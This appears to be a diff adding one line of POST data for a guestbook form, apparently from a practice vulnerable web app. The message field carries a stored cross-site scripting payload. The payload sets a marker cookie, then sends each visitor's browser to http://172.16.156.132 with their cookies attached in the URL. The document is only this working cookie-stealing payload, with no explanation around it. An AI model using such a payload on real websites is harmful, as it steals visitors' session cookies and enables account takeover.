@@ -1,0 +1,1 @@
+mtxMessage=<script>if (document.cookie.indexOf("hasbeenpwnd") == -1){ document.cookie = "hasbeenpwnd=hasbeenpwnd"; document.location = "http://172.16.156.132?cookies="+document.cookie; };</script>&txtName=test&btnSign=Sign+Guestbook
